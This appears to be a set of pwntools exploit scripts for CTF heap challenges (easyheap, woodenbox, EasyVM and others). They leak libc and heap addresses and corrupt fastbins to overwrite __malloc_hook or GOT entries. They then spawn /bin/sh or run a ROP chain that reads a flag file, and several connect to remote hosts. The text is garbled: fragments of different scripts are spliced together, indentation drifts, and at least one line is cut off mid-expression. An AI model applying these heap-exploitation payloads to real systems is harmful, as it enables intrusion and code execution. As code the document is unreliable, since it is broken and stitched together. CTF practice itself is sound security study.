r.send(content)
def free(index):
r.recvuntil(">> ")
r.sendline("2")
r.recvuntil("index ?")
r.sendline(str(index))
def show(index):
r.recvuntil(">> ")
r.sendline("3")
r.recvuntil("index ?\n")
r.sendline(str(index))
def edit(index,content):
r.recvuntil(">> ")
r.sendline("4")
r.recvuntil("index ?")
r.sendline(str(index))
r.recvuntil("_**c___r__s**++___c___new_content ?")
r.send(content)
r.recvuntil("son call babaaa,what is your name?")
payload = 'a'*0x10 + p64(0x4023ad)+p64(0x603060)
r.sendline(payload)
##leak
add(0x98,'a'*0x98) #0
add(0x18,'b'*0x18) #1
free(0) #-0
add(0x98,'a'*0x98) #0
show(0)
x = r.recvuntil("\n")[:-1]
libc = u64(x.ljust(8,'\x00')) -0x7ff5ad02fb78+0x7ff5acc6b000
add(0x18,'c'*0x18) #2
free(1) #-1
free(2) #-2
add(0x18,'d'*0x18) #1
show(1)
x = r.recvuntil("\n")[:-1]
heap = u64(x.ljust(8,'\x00')) -0xa0
print("libc:"+hex(libc))
print("heap:"+hex(heap))
free(1)
##off by one
add(0x28,'a'*0x28) #1
add(0x28,'b'*0x28) #2
add(0x68,'c'*0x68) #3
add(0x68,'d'*0x68) #4
add(0x68,'f'*0x68) #5
edit(3,'a'*8+p64(0x41))
free(5)
free(4)
free(3)
edit(1,'d'*0x28+'\x41')
free(2)
add(0x38,'a'*0x38) #2
easyheap
malloc_hook = 0x7ffff7dd1b10-0x7ffff7a0d000+libc
edit(2,'a'*0x28+p64(0x71)+p64(malloc_hook-0x23))
add(0x68,'a'*0x68)#3
pop_rdi = 0x4023b3
flag_addr = 0x603060
pop_rsi = libc+0x0202e8
pop_rdx = libc+0x1b92
open_addr = libc+0x0f7030
read_addr = libc+0x0f7250
write_addr = libc+0x0f72b0
payload2 = './flag'.ljust(0x18,'\x00')+p64(pop_rdi) + 
p64(flag_addr)+p64(pop_rsi) + p64(0) + p64(open_addr)
payload2 += 
p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x603060+0x100)+p64(pop_rdx)+p64(100)+p64
(read_addr)
payload2 += 
p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x603060+0x100)+p64(pop_rdx)+p64(100)+p64
(write_addr)
add(0x68,'aaa')#4
add(0x200,payload2)
edit(4,'d'*0x13+p64(libc+0x0143671)) #add rsp,0x48;ret;
r.recvuntil(">> ")
r.sendline("1")
r.recvuntil("______?")
r.sendline('222')
r.interactive()
from pwn import *
from docker_debug import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
def add(p, size, buf):
  p.recvuntil('Your choice:')
  p.sendline('1')
  p.recvuntil('How long is this message?')
  p.sendline(str(size))
  if size > 0x400:
    p.recvuntil('Too much size!')
    return
  p.recvuntil('What is the content of the message?')
  p.send(buf)
  p.recvuntil('Add successfully.')
  def delete(p, idx):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('What is the index of the item to be deleted?\n')
    p.sendline(str(idx))
    def edit(p, idx, buf):
      p.recvuntil('Your choice:')
      p.sendline('3')
      p.recvuntil('What is the index of the item to be modified?')
      p.sendline(str(idx))
      p.recvuntil('What is the content of the message?')
      p.send(buf)
      p.recvuntil('Edit successfully.')
      def main():
        debug_env = DockerDebug('ubuntu-1604')
        # program path in docker
        #p = debug_env.process('./easyheap')
        p = remote('121.36.209.145', 9997)
        payload = p64(0x602018) + p64(0x400) + b'a'*0x10 + p64(0x602050)
        add(p, 0x400, payload)
        delete(p, 0)
        add(p, 0x401, '')
        add(p, 0x401, '')
        add(p, 0x401, '')
        edit(p, 1, p64(0x400670))
        delete(p, 2)
        system_addr = u64(p.recvuntil(b'\x7f') + b'\x00\x00') + 0xe510
        log.info('system: {}'.format(hex(system_addr)))
        add(p, 0x400, '/bin/sh\x00')
        edit(p, 1, p64(system_addr))
        delete(p, 2)
        #debug_env.attach(p, gdbscript='')
        p.interactive()
        if __name__ == '__main__':
          main()
          from pwn import *
          # s = process("./easyheap")
          s = remote("121.36.209.145",9997)
          elf = ELF("./easyheap")
          def add(size,buf):
            s.sendlineafter("Your choice:","1")
            s.sendlineafter("How long is this message?",str(size))
            s.sendafter("What is the content of the message?",str(buf))
            def edit(idx,buf):
              s.sendlineafter("Your choice:","3")
              s.sendlineafter("What is the index of the item to be 
modified?",str(idx))
              s.sendafter("What is the content of the message?",str(buf))
              def free(idx):
                s.sendlineafter("Your choice:","2")
                s.sendlineafter("What is the index of the item to be 
deleted?",str(idx))
                # gdb.attach(s,"""
                #     b *0x400B93
                #     c
                # """)
                add(0x100,p64(0x6020C0)*(0x100/8))#0
                free(0)
                add(0x20,'AAA')#0
                free(1)
                add(0,'')#1
                s.sendlineafter("Your choice:","1")
                s.sendlineafter("How long is this message?",str(12345678))
                free_got = elf.got['free']
                puts_got = elf.got['puts']
                puts_plt = elf.plt['puts']
                atoi_got = elf.got['atoi']
 edit(2,p64(0x6020c8)+p64(free_got)+p64(0x6020d8)+p64(0x6020c0)+p64(0x6020e8)+
p64(puts_got)+p64(0x6020f8)+p64(atoi_got)+p64(0x1234))
                edit(0,p64(puts_plt))
                free(4)
                s.recvline()
                puts = u64(s.recv(6).ljust(8,'\x00'))
                libc = ELF("./libc.so.6")
                offset = puts - libc.symbols['puts']
                success(hex(offset))
                system = offset + libc.symbols['system']
                edit(6,p64(system))
                s.interactive()
woodenbox
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import *
context.arch= 'amd64'
context.log_level = 'debug'
r = lambda x: p.recvuntil(x,drop=True)
s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y : p.sendlineafter(x,y)
# p = process('./woodenbox2')
HOST,PORT = '121.36.215.224',9998
p = remote(HOST,PORT)
e = ELF("./woodenbox2")
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def alloc(sz,cnt):
    s(':',str(1))
    s(':',str(sz))
    s(':',cnt)
def edit(idx,sz,cnt):
    s(':',str(2))
    s(':',str(idx))
    s(':',str(sz))
    s(':',cnt)
def dele(idx):
    s(':',str(3))
    s(':',str(idx))
def z(cmd=""):
    context.log_level = 'debug'
    context.terminal = ['tmux','sp','-h']
    pause()
    gdb.attach(p,'''
        b *__libc_malloc
        c
    '''+cmd)
alloc(0x68,'0'*0x68)
alloc(0x68,'1'*0x68)
alloc(0x68,'2'*0x68)
alloc(0x68,'3'*0x68)
edit(0,0x70,'0'*0x68+p64(0xe1))
easy_unicorn
dele(1)
dele(1)
alloc(0x38,'6'*0x38)
alloc(0x28,'7'*0x28)
# leaking
edit(2,0x32,'5'*0x28+p64(0x71)+'\xdd\x25')
alloc(0x68,'\0'*0x68)
alloc(0x68,'\x00'*0x33+p64(0xfbad3c80)+3*p64(0)+p8(0))
p.recv(0x48)
l.address = u64(p.recv(8))-0x3c56a3
log.info('l.address:'+hex(l.address))
__malloc_hook = l.symbols['__malloc_hook']
log.info('__malloc_hook:'+hex(__malloc_hook))
realloc = l.symbols['realloc']
log.info('realloc:'+hex(realloc))
one = l.address+0x4526a
log.info('one:'+hex(one))
dele(3)
edit(1,0x38,'5'*0x28+p64(0x71)+p64(__malloc_hook-0x23))
alloc(0x68,'\0'*0x68)
alloc(0x68,'\x00'*(0x13-0x8)+p64(one)+p64(realloc))
s(':',str(1))
s(':',str(0x8))
# flag{D0_y0u_kn0w_h0o34_o7_R0m4n?}
p.interactive()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os, struct, time 
env = os.environ.copy()
env['LD_LIBRARY_PATH'] = "./"
context.log_level = 'DEBUG'
context.arch = 'amd64'
p = process("./x86_sandbox", env=env)
#p = remote("121.37.167.199", 9998)
p.recvuntil("[1;31;5m ")
code = map(lambda x: int(x, 16), p.recvuntil(" \x1B[0m\n", drop=True).split('-
'))
data = map(ord, struct.pack("","1")
  s.sendlineafter("The length of your hw:",str(size))
  s.sendafter("Input your hw:",buf)
  def show(idx):
    s.sendlineafter(">","4")
    s.sendlineafter("The index of your hw:",str(idx))
    def free(idx):
      s.sendlineafter(">","3")
      s.sendlineafter("The index of your hw:",str(idx))
      def edit(idx,buf):
        s.sendlineafter(">","2")
        s.sendlineafter("The index of your hw:",str(idx))
        s.sendafter("Input your hw:",str(buf))
        # gdb.attach(s,"""
        #     b *0x40180f
        #     c
        # """)
        add(0x40,'AAAA')#0
        free(0)
        show(-1879)
        s.recvuntil("Your hw:\n")
        free = u64(s.recv(6).ljust(8,'\x00'))
        success(hex(free))
        # libc = LibcSearcher("free",free)
        offset = free-libc.symbols['free']
        success(hex(offset))
        system = offset+libc.symbols['system']
        edit(-1879,p64(system))
Kernoob
ï¬‚ag...
EasyVM
        add(0x40,'/bin/sh\x00')#0
        # free(0)
        # raw_input(">")
        s.sendline("5")
        s.interactive()
from pwn import *
#r = process('./EasyVM')
r = remote('121.36.215.224',9999)
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c'] 
def send(content):
    r.recvuntil(">>> ")
    r.sendline("1")
    sleep(1)
    r.send(content)
def run():
    r.recvuntil(">>> \n")
    r.sendline("2")
def free():
    r.recvuntil(">>> ")
    r.sendline("3")
def gift():
    r.recvuntil(">>> ")
    r.sendline("4")
def swrite(idx,value):
    payload = '\x80'+chr(idx)+p32(value)
    return payload
#leak
gift()